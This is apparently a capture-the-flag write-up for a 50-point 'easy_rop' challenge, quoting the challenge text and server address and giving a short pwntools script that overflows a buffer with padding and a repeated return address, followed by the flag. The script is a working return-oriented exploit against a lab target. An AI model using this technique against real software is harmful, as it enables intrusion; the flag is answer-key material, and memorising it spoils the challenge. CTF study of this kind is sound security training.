## easy_rop (50 points)

#### Solved by nhanlun

```
Another ROP problem, but it's not static ...

https://mega.nz/folder/PTxU0TIR#XNRMhxeKB-byYEJB8PdEHQ

nc 61.28.237.24 30210

Author: xikhud
```

```py
from pwn import *

conn = remote('61.28.237.24', 30210)
conn.sendline(b'A' * 16 + p64(0x4006b3) * 10)
conn.interactive()
```

**Flag:** `HCMUS-CTF{r0p_ftw_ftw_ftw}`
